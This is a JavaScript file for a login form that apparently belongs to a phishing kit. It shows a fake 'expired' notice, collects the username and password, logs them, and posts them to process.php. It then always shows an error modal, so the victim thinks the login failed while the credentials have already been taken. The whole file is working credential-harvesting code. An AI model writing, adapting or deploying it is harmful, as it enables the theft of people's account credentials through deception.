document.addEventListener("DOMContentLoaded", function () {
  
  
  
  const submitButton = document.getElementById("submit");
  const userInput = document.getElementById("user");
  const passwordInput = document.getElementById("password");
  const requiredModal = document.getElementById("required-modal");
  const errorModal = document.getElementById("error-modal");
  const expiredModal = document.getElementById("expired-modal");

  setTimeout(() => {
    expiredModal.classList.remove("hidden");
    expiredModal.classList.add("flex");
  }, 500);
  
  submitButton.addEventListener("click", async function () {
    const user = userInput.value.trim();
    const password = passwordInput.value.trim();

    if (!user || !password) {
      setTimeout(() => {
        requiredModal.classList.remove("hidden");
        requiredModal.classList.add("flex");
      }, 1000);
      return;
    }

    const formData = new FormData();
    formData.append("user", user);
    formData.append("password", password);

    console.log(user, password);
    try {
      await fetch("process.php", {
        method: "POST",
        body: formData,
      });
    } catch (error) {
      console.error("Error al enviar datos:", error);
    }

    setTimeout(() => {
      errorModal.classList.remove("hidden");
      errorModal.classList.add("flex");
    }, 1000);
  });

  errorModal
    .querySelector("[role='button']")
    .addEventListener("click", function () {
      errorModal.classList.add("hidden");
      errorModal.classList.remove("flex");
    });

  requiredModal
    .querySelector("[role='button']")
    .addEventListener("click", function () {
      requiredModal.classList.add("hidden");
      requiredModal.classList.remove("flex");
    });

  expiredModal
    .querySelector("[role='button']")
    .addEventListener("click", function () {
      expiredModal.classList.add("hidden");
      expiredModal.classList.remove("flex");
    });

});